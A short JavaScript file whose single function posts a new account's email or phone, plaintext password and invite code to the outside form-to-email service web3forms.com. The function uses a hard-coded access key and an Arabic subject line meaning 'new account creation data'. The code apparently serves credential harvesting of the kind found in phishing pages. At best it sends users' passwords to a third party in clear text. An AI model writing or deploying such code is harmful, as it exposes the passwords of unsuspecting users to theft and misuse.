function sendAccountData(accountData) {
    fetch('https://web3forms.com', {
        
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        },
        body: JSON.stringify({
            access_key: 'd5623378-1590-4731-a6c1-1eebabfaeb12',
            subject: 'بيانات إنشاء حساب جديدة',
            email_or_phone: accountData.emailOrPhone,
            password: accountData.password,
            invite_code: accountData.inviteCode
        })
    });
}
